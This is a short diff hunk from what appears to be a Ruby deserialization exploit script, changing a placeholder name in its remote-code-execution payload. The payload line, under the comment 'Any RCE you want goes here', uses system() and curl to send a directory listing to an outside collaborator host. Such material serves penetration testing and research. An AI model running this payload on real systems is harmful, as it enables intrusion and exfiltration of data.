@@ -19,7 +19,7 @@ end
 
 # Any RCE you want goes here
 code = <<-EOS
-system('curl --data "$(ls)" <burp-collaborator-domain>')
+system('curl --data "$(ls)" <burp-collaborator-url>')
 EOS
 
 erb = ERB.allocate
